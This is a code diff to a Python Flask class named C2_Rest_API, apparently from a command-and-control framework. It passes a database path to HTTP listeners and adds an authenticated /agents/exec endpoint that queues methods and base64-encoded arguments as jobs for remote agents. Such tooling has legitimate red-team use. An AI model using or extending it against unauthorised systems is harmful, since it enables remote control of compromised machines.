@@ -150,7 +150,7 @@ class C2_Rest_API:
                     secret_key = base64.b64encode(base64.a85encode(b"token-"+"".join([random.choice("azertyuiopmlkjhgfdsqwxcvbn1234567890AZERTYUIOPMLKJHGFDSQWXCVBN") for _ in range(random.randint(25,30))]).encode())).decode()
                 else:
                     secret_key = data["secret_key"]
-                listener = HTTP_Handler(data["port"],data["host"],bool(int(data["ssl"])),False,admin_key,secret_key)
+                listener = HTTP_Handler(data["port"],data["host"],bool(int(data["ssl"])),False,self.db_path,admin_key,secret_key)
                 self.all_listeners[f"{data['host']}:{data['port']}"]=listener
                 if len(db_exec(check_if_listener_exists(data["port"]),self.db_path))==0:
                     db_exec(add_listener_to_db(data["host"],data["port"],str(data["ssl"]),0,secret_key,admin_key),self.db_path)
@@ -471,8 +471,25 @@ class C2_Rest_API:
                 all_agents[f"{listener.host}:{listener.port}"]=all_listener_agents
             log_info(f"Agent list provided to '{username}'","success")
             return json.dumps({"result":all_agents})
-            
-
+        
+        @api.route("/agents/exec",methods=["POST"])
+        def exec_method_agent():
+            if not "X-Auth" in request.headers.keys() or not self.verify_token(request.headers["X-Auth"]):
+                log_info("Someone tried to access a webpage without being authenticated/giving a good password","error")
+                return "[Error] Please provide an API Key via X-Auth or correct the one you gave"
+            else:
+                username = db_exec(get_user_from_token(request.headers["X-Auth"]),self.db_path)[0][0]
+            data = request.json
+            if not "agent_id" in data.keys() or not "method" in data.keys() or not "arguments" in data.keys():
+                return "[Error] Please provide all the required fields"
+            agent_id = data["agent_id"]
+            method = data["method"]
+            arguments = data["arguments"]
+            if not re.match(r"^[a-zA-Z0-9]+$",agent_id) or not re.match(r"^[a-z0-9A-Z_]+$",method):
+                return "[Error] Some fields contain invalid data"
+            arguments = base64.b64encode(arguments.encode()).decode()
+            db_exec(add_job_to_db(agent_id,method,arguments),self.db_path)
+            return "[Success] Job added to db"
 
         self.api = api
         
@@ -503,7 +520,7 @@ class C2_Rest_API:
                 temp_dict[ordered_fields[index]] = value
             output_json["result"].append(temp_dict)
         for listener in output_json["result"]:
-            listener_object = HTTP_Handler(listener["port"],listener["host"],bool(int(listener["ssl"])),False,listener["admin_key"],listener["secret_key"])
+            listener_object = HTTP_Handler(listener["port"],listener["host"],bool(int(listener["ssl"])),False,self.db_path,listener["admin_key"],listener["secret_key"])
             self.all_listeners[f"{listener['host']}:{listener['port']}"]=listener_object
             log_info(f"Listener {listener['host']}:{listener['port']} created","success")
             if int(listener["active"])==1:
